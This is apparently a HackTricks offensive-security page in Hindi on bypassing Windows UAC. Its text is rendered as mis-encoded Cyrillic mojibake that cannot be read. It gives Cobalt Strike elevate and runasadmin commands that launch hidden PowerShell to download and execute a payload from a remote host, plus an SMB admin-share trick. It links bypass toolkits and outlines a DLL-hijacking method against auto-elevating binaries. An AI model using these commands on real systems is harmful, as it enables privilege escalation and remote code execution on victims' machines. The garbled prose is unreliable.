рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╢реИрд▓ рдХреЗ рд╢реЗрд▓ рд╣реИ рдЬреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИ, рддреЛ рдЖрдк **SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ C$** рд╕рд╛рдЭрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо) рдПрдХ рдирдпреЗ рдбрд┐рд╕реНрдХ рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдФрд░ рдЖрдкрдХреЛ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рд╕рдм рдХреБрдЫ рдПрдХреНрд╕реЗрд╕** рдорд┐рд▓реЗрдЧрд╛ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рднреА).

{% hint style="warning" %}
**рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЯреНрд░рд┐рдХ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC рдмрд╛рдЗрдкрд╛рд╕ рдХреЛ рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдХреЗ рд╕рд╛рде

рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рддрдХрдиреАрдХреЗрдВ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдВрдЧреА рдЬрдм рдпреВрдПрд╕реА рдореИрдХреНрд╕ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИред
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** рдФрд░ **Metasploit** рдХреЗ рдкрд╛рд╕ рднреА рдХрдИ рдореЙрдбреНрдпреВрд▓ рд╣реИрдВ рдЬреЛ **UAC** рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред

### KRBUACBypass

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдФрд░ рдЙрдкрдХрд░рдг [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕

[**UACME**](https://github.com/hfiref0x/UACME) рдЬреЛ рдХрдИ UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХрд╛ **рд╕рдВрдХрд▓рди** рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **рд╡рд┐рдЬреБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдпрд╛ рдПрдордПрд╕рдмрд┐рд▓реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ UACME рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рд╕реЗ рдХрдИ executables (рдЬреИрд╕реЗ `Source\Akagi\outout\x64\Debug\Akagi.exe`) рдмрдиреЗрдВрдЧреЗ, рдЖрдкрдХреЛ **рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреМрди рд╕рд╛ рдЪрд╛рд╣рд┐рдП**ред\
рдЖрдкрдХреЛ **рд╕рд╛рд╡рдзрд╛рди рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдмрд╛рдЗрдкрд╛рд╕реЗрд╕ рдРрд╕реЗ рдХреБрдЫ рдЕрдиреНрдп рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЛ **рдкреНрд░реЙрдореНрдкреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдХреБрдЫ рд╣реЛ рд░рд╣рд╛ рд╣реИред

UACME рдореЗрдВ рд╣рд░ рддрдХрдиреАрдХ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рд▓рдЧрдиреЗ рд╡рд╛рд▓реЗ **рдмрд┐рд▓реНрдб рд╕рдВрд╕реНрдХрд░рдг** рд╣реИред рдЖрдк рдЕрдкрдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рд╡рд╛рд▓реА рдХрд┐рд╕реА рддрдХрдиреАрдХ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### рдФрд░ UAC рдмрд╛рдЗрдкрд╛рд╕

**рд╕рднреА** рддрдХрдиреАрдХреЗрдВ рдЬреЛ рдпрд╣рд╛рдБ UAC рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╣реИрдВ **рдПрдХ рдкреВрд░реНрдг рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓** рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рд╛рде рдЪрд╛рд╣рд┐рдП (рдПрдХ рд╕рд╛рдорд╛рдиреНрдп nc.exe рд╢реИрд▓ рдХрд╛рдлреА рдирд╣реАрдВ рд╣реИ)ред

рдЖрдк рдПрдХ **рдореАрдЯрд░рдкреНрд░реАрдЯрд░** рд╕рддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **1** рдХреЗ рд╕рддреНрд░ рдорд╛рди рд╡рд╛рд▓реЗ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рдорд╛рдЗрдЧреНрд░реЗрдЯ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)

### GUI рдХреЗ рд╕рд╛рде UAC рдмрд╛рдЗрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **GUI рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рдЬрдм рдЖрдкрдХреЛ UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдорд┐рд▓реЗ рддреЛ рдЖрдк рдмрд╕ рдЙрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдкрдХреЛ рдЗрд╕реЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рд╡рд╛рд╕реНрддрд╛ рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП, GUI рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдЖрдк UAC рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдиреЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдерд╛ GUI рд╕рддреНрд░ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ рдХреБрдЫ **рдЙрдкрдХрд░рдг рд╣реЛрдВрдЧреЗ рдЬреЛ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ** рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк **рдЙрдЪреНрдЪрддрдо рдкреНрд░рд╢рд╛рд╕рди** рдореЗрдВ **рдПрдХ cmd** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ **рдПрдХ cmd** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдмрд┐рдирд╛ рдлрд┐рд░ рд╕реЗ UAC рджреНрд╡рд╛рд░рд╛ рдкреБрдирдГ рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)ред рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ **рдЫрд┐рдкрдХрд▓реА** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╢реЛрд░рдЧреБрд▓ UAC рдмрд╛рдЗрдкрд╛рд╕

рдпрджрд┐ рдЖрдк рд╢реЛрд░рдЧреБрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ рдХреБрдЫ рдРрд╕рд╛ **рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рддрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдЙрдЪреНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИ**ред

### рдЕрдкрдирд╛ рдмрд╛рдЗрдкрд╛рд╕ - рдореМрд▓рд┐рдХ UAC рдмрд╛рдЗрдкрд╛рд╕ рдореЗрдердбреЛрд▓реЙрдЬреА

рдпрджрд┐ рдЖрдк **UACME** рдХреА рдУрд░ рджреЗрдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗ рдХрд┐ **рдЕрдзрд┐рдХрд╛рдВрд╢ UAC рдмрд╛рдЗрдкрд╛рд╕ рдПрдХ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг dll рдХреЛ _C:\Windows\System32_ рдкрд░ рд▓рд┐рдЦрдирд╛)ред [рдПрдХ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреИрд╕реЗ рдЦреЛрдЬреЗрдВ рдЗрд╕реЗ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ](../windows-local-privilege-escalation/dll-hijacking.md)ред

1. рдПрдХ рдмрд╛рдЗрдирд░реА рдвреВрдВрдвреЗрдВ рдЬреЛ **рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрд╛** рдХрд░реЗрдЧрд╛ (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЬрдм рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЙрдЪреНрдЪ рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХ рд╕реНрддрд░ рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ)ред
2. Procmon рдХреЗ рд╕рд╛рде "**NAME NOT FOUND**" рдШрдЯрдирд╛рдПрдБ рдЦреЛрдЬреЗрдВ рдЬреЛ **DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ** рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
3. рдЖрдкрдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреБрдЫ **рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ** (рдЬреИрд╕реЗ C:\Windows\System32) рдореЗрдВ DLL рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВред рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
1. **wusa.exe**: Windows 7,8 рдФрд░ 8.1ред рдпрд╣ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ рдореЗрдВ CAB рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдЪреНрдЪ рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХ рд╕реНрддрд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)ред
2. **IFileOperation**: Windows 10ред
4. рд╕рдВрд░рдХреНрд╖рд┐рдд рдкрде рдореЗрдВ рдЕрдкрдиреА DLL рдХреЙрдкреА рдХрд░рдиреЗ рдФрд░ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдФрд░ рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрд╛ рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рддреИрдпрд╛рд░ рдХрд░реЗрдВред

### рдПрдХ рдФрд░ UAC рдмрд╛рдЗрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ рдПрдХ **рд╕реНрд╡рдд: рдЙрдЪреНрдЪрддрд╛ рд╡рд╛рд▓рд╛ рдмрд╛рдЗрдирд░реА** рдпрджрд┐ рдХрд┐рд╕реА **рдирд╛рдо/рдкрде** рдХреЛ **рдкрдарди** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ **рдмрд╛рдЗрдирд░реА** рдпрд╛ **рдХрдорд╛рдВрдб** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рдЕрдзрд┐рдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **HKCU** рдХреЗ рдЕрдВрджрд░ рдЦреЛрдЬрддрд╛ рд╣реИ)ред

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
